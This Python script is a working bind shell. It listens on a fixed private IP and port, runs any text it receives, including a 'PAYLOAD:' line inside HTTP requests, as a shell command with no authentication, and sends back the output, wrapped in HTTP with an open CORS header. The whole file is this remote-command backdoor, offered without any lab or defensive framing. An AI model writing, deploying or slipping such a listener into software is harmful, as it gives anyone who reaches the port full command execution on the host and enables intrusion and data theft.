import socket as s,subprocess as sp;


def dispatch_http_call(content):
    response = (
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: text/html; charset=utf-8\r\n"
        "Access-Control-Allow-Origin: *\r\n"
        f"Content-Length: {len(content.decode('utf-8'))}\r\n"
        "Connection: close\r\n"
        "\r\n"
        f"{content.decode('utf-8')}"
    )
    return response.encode("utf-8")

s1 = s.socket(s.AF_INET, s.SOCK_STREAM)
s1.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1)
s1.bind(("192.168.157.123", 9002))
s1.listen(1)

print("Server is listening...")




while True:
    # maybe throw 404 or something to http connections? or maybe authenticate.. blah :(
    c, a = s1.accept()
    print(f"Connection from {a}")

    while True:
        try:
            d = c.recv(1024).decode()
            print("d", d)
            
            if not d:
                print("Breaking")
                break  # client disconnected

            if True: # parse and see if this is an html call
                nonhtmled = [i for i in d.split("\n") if "PAYLOAD:" in i]

                print("nonhtmled", nonhtmled, "\n\n")
                
                if len(nonhtmled) > 0:
                    d = nonhtmled[0].split("PAYLOAD:")[-1]
                    print("dd", d)
                p = sp.Popen(d, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)
                out, err = p.communicate()
                result = out + err
                print("result:",result)
                d = None
                str_package = result.replace(b'\r\n', b'<RNL>').replace(b'\n', b'<NL>') + b"\n"
                print(str_package)
                c.sendall(dispatch_http_call(str_package))
                c.close()
                break
            
            p = sp.Popen(d, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)
            out, err = p.communicate()
            result = out + err
            d = None
            str_package = result.replace(b'\r\n', b'<RNL>').replace(b'\n', b'<NL>') + b"\n"
            print(str_package)
            c.sendall(str_package)
            c.close()
            print("closing call")
        except Exception as e:
            print("Client connection error:", e)
            break

    c.close()
    print("Client disconnected.")
 
